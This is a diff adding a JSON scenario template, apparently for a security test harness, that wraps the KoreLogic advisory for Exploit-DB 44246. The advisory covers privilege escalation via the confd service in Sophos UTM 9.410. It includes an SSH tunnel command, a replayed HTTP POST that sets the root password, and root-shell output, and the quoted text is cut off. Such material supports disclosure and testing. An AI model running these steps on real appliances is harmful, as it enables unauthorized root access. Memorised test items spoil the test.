@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44246",
+  "category": "D1_credential",
+  "attack_technique": "T1552.001",
+  "cwe": "CWE-256",
+  "description": "Linux privilege escalation: Sophos UTM 9.410 - 'loginuser' 'confd' Service Privilege Escalation\n\nExploit source code (44246.txt):\n```\nKL-001-2018-007 : Sophos UTM 9 loginuser Privilege Escalation via confd Service\n\nTitle: Sophos UTM 9 loginuser Privilege Escalation via confd Service\nAdvisory ID: KL-001-2018-007\nPublication Date: 2018.03.02\nPublication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2018-007.txt\n\n\n1. Vulnerability Details\n\n     Affected Vendor: Sophos\n     Affected Product: UTM 9\n     Affected Version: 9.410\n     Platform: Embedded Linux\n     CWE Classification: CWE-306: Missing Authentication for Critical Function (SID generation)\n     Impact: Privilege Escalation\n     Attack vector: SSH\n\n2. Vulnerability Description\n\n     The attacker must know the password for the loginuser\n     account. The confd client is not available to the loginuser\n     account. However, the running service is accessible over\n     a network port on the loopback interface. By replaying the\n     network traffic required to obtain a SID from this service it\n     is possible to escalate privileges to root.\n\n3. Technical Description\n\n     1. Obtain the a privileged session token\n\n     $ ssh -Nf -L 127.0.0.1:4472:127.0.0.1:4472 loginuser@1.3.3.7\n     loginuser@1.3.3.7's password:\n     $ python kl-loginuser-confd-priv_esc.py\n     pojiZSqWEUAUDNIQtSop\n\n     2. Using that session token, set the root password\n\n     POST /webadmin.plx HTTP/1.1\n     Host: 1.3.3.7:4444\n     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0\n     Accept: text/javascript, text/html, application/xml, text/xml, */*\n     Accept-Language: en-US,en;q=0.5\n     X-Requested-With: XMLHttpRequest\n     X-Prototype-Version: 1.5.1.1\n     Content-Type: application/json; charset=UTF-8\n     Referer: https://1.3.3.7:4444/\n     Content-Length: 422\n     Cookie: SID=pojiZSqWEUAUDNIQtSop\n     DNT: 1\n     Connection: close\n\n     {\"objs\": [{\"ack\": null, \"elements\": {\"root_pw_1\": \"korelogic\", \"root_pw_2\": \"korelogic\", \"loginuser_pw_1\":\n\"loginuser\", \"loginuser_pw_2\": \"loginuser\"}, \"FID\": \"system_settings_shell\"}], \"SID\": \"pojiZSqWEUAUDNIQtSop\", \"browser\":\n\"gecko\", \"backend_version\": \"2\", \"loc\": \"english\", \"_cookie\": null, \"wdebug\": 0, \"RID\":\n\"1490305723111_0.8089407793028881\", \"current_uuid\": \"2844879a-e014-11da-b3ae-0014221e9eba\", \"ipv6\": false}\n\n     HTTP/1.1 200 OK\n     Date: Thu, 23 Mar 2017 15:33:53 GMT\n     Server: Apache\n     Expires: Thursday, 01-Jan-1970 00:00:01 GMT\n     Pragma: no-cache\n     X-Frame-Options: SAMEORIGIN\n     X-Content-Type-Option: nosniff\n     X-XSS-Protection: 1; mode=block\n     Vary: Accept-Encoding\n     Connection: close\n     Content-Type: application/json; charset=utf-8\n     Content-Length: 178895\n\n     {\"SID\":\"pojiZSqWEUAUDNIQtSop\",\"ipv6\":false,\"current_uuid\":\"2844879a-e014-11da-b3ae-0014221e9eba\",[snip over 9000]\n\n     3. Look for success message.\n\n     \"objs\":[{\"success\":[{\"text\":\"Shell user password(s) set successfully.\"}]\n\n     4. Profit.\n\n     loginuser@[redacted]:/home/login > su\n     Password:\n     [redacted]:/home/login # id\n     uid=0(root) gid=0(r\n```",
+  "cve": "",
+  "exploitdb_id": "44246",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44246",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ]
+}
